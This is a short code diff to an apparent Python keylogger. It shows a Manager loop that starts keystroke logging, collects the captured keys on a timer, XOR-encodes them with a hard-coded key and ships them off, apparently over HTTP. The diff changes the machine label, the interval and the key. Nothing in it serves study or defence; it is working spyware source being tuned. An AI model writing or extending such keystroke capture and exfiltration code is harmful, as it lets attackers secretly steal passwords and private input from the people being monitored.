@@ -1,4 +1,3 @@
-from pynput import keyboard
 from datetime import datetime
 from flask import jsonify
 import requests
@@ -48,7 +47,7 @@ class AddToFile:
         if not combined_keys:
             return None
         timestamp = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
-        data = {"machine":"abcd","logs":{timestamp:combined_keys}}
+        data = {"machine":"shenaor","logs":{timestamp:combined_keys}}
         return data
 
 
@@ -72,9 +71,9 @@ class Manager:
     def run(self):
         self.keylogger.start_logging()
         while True:
-            time.sleep(5)
+            time.sleep(10)
             keys = self.keylogger.get_logged_keys()
-            data = self.add.xor_encrypt(keys,"01234567891")
+            data = self.add.xor_encrypt(keys,"0123456789")
             self.send.sendung(self.add.create_file(data))
             if keys == "Key.ctrl_l":
                 self.keylogger.stop_logging()
